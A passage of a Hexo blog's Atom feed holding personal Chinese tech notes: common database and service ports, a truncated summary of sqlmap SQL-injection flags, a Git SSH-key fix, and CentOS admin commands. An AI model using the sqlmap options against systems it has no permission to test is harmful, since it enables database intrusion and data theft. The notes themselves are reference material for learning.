title="常见数据库端口号"></a>常见数据库端口号</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Oracle 默认1521</span><br><span class="line"></span><br><span class="line">SQL Server 默认1433</span><br><span class="line"></span><br><span class="line">Mysql默认3306</span><br><span class="line"></span><br><span class="line">21 FTP </span><br><span class="line"></span><br><span class="line">22 ssh</span><br><span class="line"></span><br><span class="line">23 telnet</span><br><span class="line"></span><br><span class="line">25 smtp</span><br><span class="line"></span><br><span class="line">109 110 pop2 pop3</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;sqlmap&quot;&gt;&lt;a href=&quot;#sqlmap&quot; class=&quot;headerlink&quot; title=&quot;sqlmap&quot;&gt;&lt;/a&gt;sqlmap&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;-u #注入点&lt;/li&gt;
&lt;li&gt;-f #指纹判别数据库类型&lt;/li&gt;
&lt;li&gt;-b #获取数据
      
    
    </summary>
    
      <category term="Note" scheme="https://winthorlimo.github.io/categories/Note/"/>
    
    
      <category term="Tools" scheme="https://winthorlimo.github.io/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>Hexo日志</title>
    <link href="https://winthorlimo.github.io/note/2019/undefined02/1c91193.html"/>
    <id>https://winthorlimo.github.io/note/2019/undefined02/1c91193.html</id>
    <published>2019-06-02T04:18:55.000Z</published>
    <updated>2020-07-31T13:36:48.466Z</updated>
    
    <content type="html"><![CDATA[<h4 id="2019-6-1"><a href="#2019-6-1" class="headerlink" title="2019.6.1"></a>2019.6.1</h4><p>Git 远程遇到了问题:</p><blockquote><p>Please make sure you have the correct access rights and the repository exists.</p></blockquote><p>发现是ssh key有问题，连接不上服务器</p><ol><li><p>首先是重新在git设置一下身份的名字和邮箱：</p><ul><li><code>git config --global user.name &quot;yourname&quot;</code></li><li><p><code>git config --global user.email &quot;your@email.com&quot;</code></p><p>注：要添加具体的yourname，your@email</p></li></ul></li><li>删除.ssh文件夹（直接搜索该文件夹）下的known_hosts</li><li><p>在 git输入命令：</p><p> <code>$ ssh-keygen -t rsa -C &quot;your@email.com&quot;</code></p><p> 然后会出现：</p><blockquote><p>Generating public/private rsa key pair. Enter file in which to save the key (/Users/your_user_directory/.ssh/id_rsa):</p></blockquote><p> 回车后系统自动在 .ssh 文件夹下生成两个文件，id_rsa和id_rsa.pub，用记事本打开id_rsa.pub，把全部内容复制</p></li><li>登陆GitHub 账户，进入设置中的“SSH and GPG keys”新建 SSH      keys 在 Key中把刚刚复制的粘贴进去，点击 add ssh key</li><li><p>在 git 中输入命令</p><p> <code>ssh -T git@github.com</code></p><p> 然后输入Yes回车，就会提示成功</p></li></ol><p>之后就可以正常 hexo d -g 啦</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;2019-6-1&quot;&gt;&lt;a href=&quot;#2019-6-1&quot; class=&quot;headerlink&quot; title=&quot;2019.6.1&quot;&gt;&lt;/a&gt;2019.6.1&lt;/h4&gt;&lt;p&gt;Git 远程遇到了问题:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Please make s
      
    
    </summary>
    
      <category term="Note" scheme="https://winthorlimo.github.io/categories/Note/"/>
    
    
      <category term="hexo" scheme="https://winthorlimo.github.io/tags/hexo/"/>
    
  </entry>
  
  <entry>
    <title>CentOS 笔记</title>
    <link href="https://winthorlimo.github.io/note/2019/undefined25/875db5e1.html"/>
    <id>https://winthorlimo.github.io/note/2019/undefined25/875db5e1.html</id>
    <published>2019-05-25T10:09:05.000Z</published>
    <updated>2020-01-30T02:24:38.806Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://qiniuyun.lintstar.top/CentOS-笔记.png" alt="CentOS-笔记"></p><h4 id="CentOS-常用命令"><a href="#CentOS-常用命令" class="headerlink" title="CentOS 常用命令"></a>CentOS 常用命令</h4><ul><li><code>shutdown -h now</code>             关机</li><li><code>shutdown -h +3</code>              三分钟后关机</li><li><code>halt</code></li><li><code>poweroff</code></li><li><p><code>init 0</code></p></li><li><p><code>shutdown -r now</code>             重启</p></li><li><code>shutdown -r +3</code>              三分钟重启</li><li><code>reboot</code></li><li><p><code>init 6</code></p></li><li><p><code>cat 1.txt | tail - n +3001 | head -n 1000</code>                       截取文件中的3001到4000</p></li><li><p><code>grep o 1.txt</code>                正常过滤</p></li><li><p><code>grep -v 1.txt</code>               反向过滤</p></li><li><p><code>cat &gt;1.txt</code>                  清空文件内容</p></li><li><p><code>ll -d /data/www</code>             查看权限</p></li><li><p><code>pkill -kill -t tty3</code>          杀死用户进程</p></li><li><p><code>mkdir /media/cdrom</code></p></li><li><code>mount /dev/sr0  /media/cdrom</code>             挂载光盘</li><li><p><code>umount /media/cdrom</code>                      卸载</p></li><li><p><code>systemctl stop firewalld.service</code>         关闭防火墙</p></li><li><code>setenforce 0</code>                             给外界权限</li><li><code>systemctl disable firewalld.service</code>      永久关闭</li><li><code>systemctl enable firewalld.service</code>       永久开启</li><li><code>vim /etc/rc.d/rc.local</code>                   设置开机启动<br>为镜像添加开机自动挂载</li><li><code>echo &quot;mount /dev/sr0  /media/cdrom&quot; &gt;&gt; /etc/rc.d/rc.local</code></li></ul><ul><li><code>vim /etc/selinux/config</code></li><li><p><code>^vim^cat</code>                        把vim替换成cat继续执行</p></li><li><p><code>ls -al</code>                          看临时文件</p></li></ul><h4 id="CentOS7-目录文件"><a href="#CentOS7-目录文件" class="headerlink" title="CentOS7 目录文件"></a>CentOS7 目录文件</h4><ul><li><code>/etc/yum.repos.d/</code>                   yum源文件位置</li><li><code>/etc/rc.d/rc.local</code>                  开机启动文件</li><li><code>rm -f /var/run/yum.pid</code></li><li><code>yum clean all</code>                       清空yum源缓存</li><li><code>/etc/nginx/conf.d/default.conf</code>      Nginx配置文件</li><li><code>vim /etc/my.cnf</code>                     去mysql密码要求</li><li><code>/usr/share/nginx/html/</code>              Nginx主页文件位置</li><li><code>/etc/httpd/conf/httpd.conf</code>          Apache配置文件</li><li><code>/var/www/html/</code>                      Apache主页文件位置</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;http://qiniuyun.lintstar.top/CentOS-笔记.png&quot; alt=&quot;CentOS-笔记&quot;&gt;&lt;/p&gt;
&lt;h4 id=&quot;CentOS-常用命令&quot;&gt;&lt;a href=&quot;#CentOS-常用命令&quot; class=&quot;headerlink&quot;
      
    
    </summary>
    
      <category term="Note" scheme="https://winthorlimo.github.io/categories/Note/"/>
    
    
      <category term="Linux" scheme="https://winthorlimo.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Who am I</title>
    <link href="https://winthorlimo.github.io/note/2019/undefined21/e3eaa03c.html"/>
    <id>https://winthorlimo.github.io/note/2019/undefined21/e3eaa03c.html</id>
    <published>2019-05-21T10:01:24.000Z</published>
    <updated>2020-01-30T02:24:38.806Z</updated>
    
    <content type="html"><![CDATA[<h3 id="未来可期"><a href="#未来可期" class="headerlink" title="未来可期"></a>未来可期</h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;未来可期&quot;&gt;&lt;a href=&quot;#未来可期&quot; class=&quot;headerlink&quot; title=&quot;未来可期&quot;&gt;&lt;/a&gt;未来可期&lt;/h3&gt;
      
    
    </summary>
    
    
      <category term="Me" scheme="https://winthorlimo.github.io/tags/Me/"/>
    
  </entry>
  
</feed>
